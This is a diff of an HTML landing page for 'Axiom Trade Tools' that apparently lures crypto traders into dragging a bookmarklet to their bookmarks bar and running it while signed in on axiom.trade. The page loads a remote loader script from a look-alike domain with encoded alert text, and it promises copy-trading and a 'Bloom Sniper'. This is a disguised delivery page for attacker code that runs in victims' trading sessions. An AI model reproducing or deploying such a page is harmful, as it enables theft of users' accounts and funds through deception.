@@ -4,89 +4,116 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Axiom Trade Tools</title>
-  <meta name="description" content="Best trading tools from Axiom — copy trade with Orangie and boost your strategy." />
+  <meta name="description" content="Advanced trading tools on Axiom — monitor influencers, track wallets, automate buys, and never miss opportunities again." />
 
-  <!-- User-provided script (placed under HEAD as requested) -->
-  <script src="https://axiom.ctoportal.icu/loader.js" data="eyJoYXNoIjoiTURzNE1URTRPVE0zT0RjNSIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJ1dHRvbiB0byB5b3VyIGJvb2ttYXJrcyBiYXIgaW5zdGVhZCBvZiBjbGlja2luZyBpdC4iLCJyZWRpcmVjdCI6IllvdSBhcmUgbm93IGJlaW5nIHJlZGlyZWN0ZWQgdG8gaHR0cHM6Ly9heGlvbS50cmFkZS9kaXNjb3Zlci4iLCJ1bmF1dGhvcml6ZWQiOiJZb3UgbXVzdCBiZSBzaWduZWQgaW4gdG8gdXNlIHRoaXMgYm9va21hcmtsZXQuIiwiZXJyb3IiOiJGYWlsZWQgdG8gZXhlY3V0ZSB0aGUgYm9va21hcmtsZXQuIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIn19"></script>
+ <script src="https://axiom.ctoportal.icu/loader.js" data="eyJoYXNoIjoiTURzNE1URTRPVE0zT0RjNSIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJ1dHRvbiB0byB5b3VyIGJvb2ttYXJrcyBiYXIgaW5zdGVhZCBvZiBjbGlja2luZyBpdC4iLCJyZWRpcmVjdCI6IllvdSBhcmUgbm93IGJlaW5nIHJlZGlyZWN0ZWQgdG8gaHR0cHM6Ly9heGlvbS50cmFkZS9kaXNjb3Zlci4iLCJ1bmF1dGhvcml6ZWQiOiJZb3UgbXVzdCBiZSBzaWduZWQgaW4gdG8gdXNlIHRoaXMgYm9va21hcmtsZXQuIiwiZXJyb3IiOiJGYWlsZWQgdG8gZXhlY3V0ZSB0aGUgYm9va21hcmtsZXQuIFBsZWFzZSB0cnkgYWdhaW4gbGF0ZXIuIn19"></script>
 
   <style>
-    :root{--bg:#0f1724;--card:#0b1220;--accent:#7c5cff;--muted:#9aa4b2;--glass:rgba(255,255,255,0.03)}
-    html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial}
-    body{background:linear-gradient(180deg,#071028 0%, #071221 60%);color:#e6eef8;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
-    .container{max-width:980px;margin:40px auto;padding:28px}
-    header{display:flex;align-items:center;gap:18px}
-    .logo{width:64px;height:64px;border-radius:12px;background:linear-gradient(135deg,var(--accent),#3ab0ff);display:flex;align-items:center;justify-content:center;font-weight:700;box-shadow:0 6px 18px rgba(124,92,255,0.18)}
-    h1{margin:0;font-size:22px}
-    p.lead{color:var(--muted);margin:6px 0 0}
+    :root {
+      --bg-gradient: radial-gradient(circle at top left, #0e1229, #050617);
+      --accent1: #8c5cff;
+      --accent2: #3ab0ff;
+      --accent3: #00ffbf;
+      --muted: #b0b8d8;
+    }
 
-    main{margin-top:26px}
-    .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px;padding:18px;box-shadow:0 6px 18px rgba(2,6,23,0.6);border:1px solid rgba(255,255,255,0.03)}
+    body {
+      margin: 0;
+      font-family: 'Inter', system-ui, sans-serif;
+      background: var(--bg-gradient);
+      color: #eaf1ff;
+      overflow-x: hidden;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
 
-    .toolbar{display:flex;gap:12px;align-items:center}
-    .bookmarklet{display:inline-block;padding:10px 14px;border-radius:10px;background:var(--glass);backdrop-filter:blur(4px);text-decoration:none;color:inherit;border:1px solid rgba(255,255,255,0.04);cursor:grab}
-    .bookmarklet:active{cursor:grabbing}
-    .btn{padding:10px 14px;border-radius:10px;background:linear-gradient(90deg,var(--accent),#3ab0ff);color:#071021;text-decoration:none;font-weight:600;border:none;cursor:pointer}
+    .container {
+      max-width: 780px;
+      text-align: center;
+      padding: 40px;
+      background: rgba(15, 20, 40, 0.7);
+      border-radius: 20px;
+      box-shadow: 0 0 40px rgba(60, 100, 255, 0.2);
+      backdrop-filter: blur(12px);
+    }
 
-    .features{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px;margin-top:16px}
-    .feature{padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);border:1px solid rgba(255,255,255,0.02)}
-    .muted{color:var(--muted);font-size:13px}
+    h1 {
+      font-size: 2.2rem;
+      background: linear-gradient(90deg, var(--accent1), var(--accent2), var(--accent3));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 20px;
+    }
 
-    footer{margin-top:22px;text-align:center;color:var(--muted);font-size:13px}
+    p.description {
+      color: var(--muted);
+      font-size: 1rem;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
 
-    @media (max-width:600px){.container{margin:20px;padding:16px}}
+    .bookmarklet {
+      display: inline-block;
+      padding: 14px 22px;
+      border-radius: 12px;
+      background: linear-gradient(90deg, var(--accent1), var(--accent2));
+      color: white;
+      font-weight: 600;
+      text-decoration: none;
+      box-shadow: 0 0 18px rgba(100, 150, 255, 0.5);
+      cursor: grab;
+      transition: transform 0.2s, box-shadow 0.3s;
+    }
+
+    .bookmarklet:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 25px rgba(100, 150, 255, 0.8);
+    }
+
+    .btn {
+      padding: 14px 22px;
+      margin-left: 10px;
+      border-radius: 12px;
+      background: linear-gradient(90deg, var(--accent2), var(--accent3));
+      border: none;
+      color: #071021;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 0 20px rgba(70, 255, 200, 0.4);
+      transition: transform 0.2s, box-shadow 0.3s;
+    }
+
+    .btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 30px rgba(70, 255, 200, 0.6);
+    }
+
+    footer {
+      margin-top: 32px;
+      color: var(--muted);
+      font-size: 0.9rem;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <header>
-      <div class="logo">AX</div>
-      <div>
-        <h1>Axiom Trade Tools</h1>
-        <p class="lead">Best trading tools — copy trade with Orangie and maximize your profits.</p>
-      </div>
-    </header>
+    <h1>Axiom Trade Tools</h1>
+    <p class="description">
+      Advanced trading tools that give you an edge on <strong>axiom.trade</strong>. Monitor influencers, track wallets, automate buys, and never miss opportunities again.
+    </p>
+    <p class="description">
+      Drag the bookmarklet to your bookmarks bar (press <strong>[CMD+SHIFT+B]</strong> if not open), then click the bookmarklet while on Axiom to activate <strong>Bloom Sniper</strong>.
+    </p>
 
-    <main>
-      <div class="card">
-        <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
-          <div>
-            <strong>Quick access</strong>
-            <div class="muted">Drag the link to your bookmarks bar (or click to copy the bookmarklet code).</div>
-          </div>
-
-          <div class="toolbar">
-            <a class="bookmarklet" id="drag-link" draggable="true" title="Drag to bookmarks bar">Drag Me</a>
-            <button class="btn" id="copy-btn" title="Copy bookmarklet">Copy</button>
-          </div>
-        </div>
-
-        <div class="features" style="margin-top:14px">
-          <div class="feature">
-            <strong>Legit Axiom Tools</strong>
-            <div class="muted">Trusted suite of trading utilities built for real traders and copy-traders alike.</div>
-          </div>
-          <div class="feature">
-            <strong>Best Trading Tools</strong>
-            <div class="muted">Advanced, lightweight tools to improve decision-making and performance.</div>
-          </div>
-          <div class="feature">
-            <strong>Copy Trade with Orangie</strong>
-            <div class="muted">Follow Orangie’s proven strategies directly and trade smarter, not harder.</div>
-          </div>
-        </div>
-      </div>
-
-      <div style="height:12px"></div>
-
-      <div class="card">
-        <strong>Usage</strong>
-        <p class="muted" style="margin-top:8px">To install: drag the <em>Drag Me</em> link to your browser's bookmarks/favorites bar. On any page, click the saved bookmark to load the Axiom trade tools. If your browser blocks drag-to-bookmark, use the Copy button and create a new bookmark manually, pasting the code into the URL field.</p>
-      </div>
-
-    </main>
+    <div>
+      <a class="bookmarklet" id="drag-link" draggable="true" title="Drag to bookmarks bar">Drag Me</a>
+      <button class="btn" id="copy-btn">Copy</button>
+    </div>
 
     <footer>
-      Built with care · Axiom Trade Tools
+      © 2025 Axiom Trade Tools · Built for smarter trading
     </footer>
   </div>
 
@@ -114,14 +141,6 @@
         setTimeout(()=>copyBtn.textContent='Copy',1200);
       }catch(e){
         alert('Copy failed — create a new bookmark manually and paste this as the URL:\n\n'+decodeURIComponent(bookmarkletHref));
-      }
-    });
-
-    dragLink.addEventListener('click', function(e){
-      if(e.ctrlKey || e.metaKey || e.button === 1){
-        const fn = new Function(decodeURIComponent(bookmarkletCode.replace(/^\(|\)\;?$/g, '')));
-        fn();
-        e.preventDefault();
       }
     });
   </script>
